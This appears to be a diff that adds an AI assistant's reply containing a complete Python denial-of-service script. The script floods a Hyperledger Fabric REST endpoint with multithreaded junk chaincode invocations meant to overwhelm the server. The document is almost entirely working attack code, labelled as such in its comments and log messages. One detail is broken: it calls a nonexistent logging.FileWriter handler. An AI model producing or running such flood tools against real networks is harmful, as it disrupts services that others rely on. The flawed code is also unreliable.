@@ -1,0 +1,127 @@
+
+Of course. Here is the complete, rewritten script that uses only the `requests` library for the attack, making the code cleaner and more focused. The `httplib2` import and its corresponding function have been removed.
+
+```python
+import json
+import requests
+import threading
+import time
+import logging
+from datetime import datetime
+import random
+import string
+
+# --- Configuration ---
+FABRIC_URL = "http://localhost:7051"  # Replace with your Fabric network's REST API URL
+CHANNEL_ID = "mychannel"  # Replace with your channel ID
+CHAINCODE_ID = "mycc"  # Replace with your chaincode ID
+NUM_TRANSACTIONS = 1000  # Number of transactions to send
+
+# Attack parameters
+NUM_THREADS = 50  # Number of concurrent threads to send transactions
+ATTACK_TIMEOUT_SECONDS = 10  # Timeout for each HTTP request
+
+# --- Logging Setup ---
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s',
+    handlers=[
+        logging.FileWriter('dos_rest_flood.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+# --- Helper Functions ---
+def generate_malformed_payload() -> str:
+    """
+    Generates a JSON payload designed to be discarded.
+    It calls a non-existent function 'invalidDiscardFunction' with random data.
+    """
+    random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=512))
+    return json.dumps({
+        "fcn": "invalidDiscardFunction",  # This function does not exist in the chaincode
+        "args": [random_data]
+    })
+
+# --- Attack Core Logic ---
+def send_transaction(thread_id: int, transactions_to_send: int):
+    """
+    Sends invalid transactions using the requests library.
+    This function is designed to be run in a separate thread.
+    """
+    headers = {'Content-Type': 'application/json'}
+    
+    # Construct the URL for a chaincode invoke request.
+    # Note: The exact API endpoint can vary based on the Fabric SDK or
+    # REST gateway implementation. This is a common pattern.
+    url = f"{FABRIC_URL}/channels/{CHANNEL_ID}/chaincodes/{CHAINCODE_ID}"
+    
+    logger.info(f"Thread {thread_id}: Starting to send {transactions_to_send} transactions.")
+
+    for i in range(transactions_to_send):
+        try:
+            payload = generate_malformed_payload()
+            
+            response = requests.post(
+                url,
+                data=payload,
+                headers=headers,
+                timeout=ATTACK_TIMEOUT_SECONDS
+            )
+            
+            # We expect a non-2xx status code (e.g., 404, 500), but the request itself is the attack.
+            # The goal is to overwhelm the server, not to get a successful response.
+            logger.info(f"Thread {thread_id}: Sent transaction {i+1}/{transactions_to_send}. Status: {response.status_code}")
+
+        except requests.exceptions.RequestException as e:
+            # These errors (connection errors, timeouts) are expected during a high-volume attack.
+            logger.warning(f"Thread {thread_id}: RequestException on transaction {i+1}: {e}")
+        except Exception as e:
+            logger.error(f"Thread {thread_id}: Unexpected error on transaction {i+1}: {e}")
+
+def run_dos_attack():
+    """
+    Main function to orchestrate the DoS attack.
+    """
+    logger.info("=== Starting DoS REST/HTTP Flood Attack ===")
+    logger.info(f"Target URL: {FABRIC_URL}")
+    logger.info(f"Target Channel: {CHANNEL_ID}")
+    logger.info(f"Target Chaincode: {CHAINCODE_ID}")
+    logger.info(f"Total Transactions to Send: {NUM_TRANSACTIONS}")
+    logger.info(f"Number of Threads: {NUM_THREADS}")
+    logger.info("--------------------------------------------------")
+
+    threads = []
+    start_time = datetime.now()
+    
+    # Calculate how many transactions each thread should send
+    transactions_per_thread = NUM_TRANSACTIONS // NUM_THREADS
+
+    # Launch all attack threads
+    for i in range(NUM_THREADS):
+        thread = threading.Thread(
+            target=send_transaction,
+            args=(i + 1, transactions_per_thread),
+            name=f"Attacker-{i+1}"
+        )
+        threads.append(thread)
+        thread.start()
+
+    # Wait for all threads to complete their work
+    for thread in threads:
+        thread.join()
+
+    end_time = datetime.now()
+    logger.info("--------------------------------------------------")
+    logger.info(f"Attack finished. Total duration: {end_time - start_time}")
+    logger.info("=== Attack Finished ===")
+
+if __name__ == "__main__":
+    try:
+        run_dos_attack()
+    except KeyboardInterrupt:
+        logger.info("Attack interrupted by user.")
+    except Exception as e:
+        logger.error(f"An unhandled error occurred in the main script: {e}")
+```
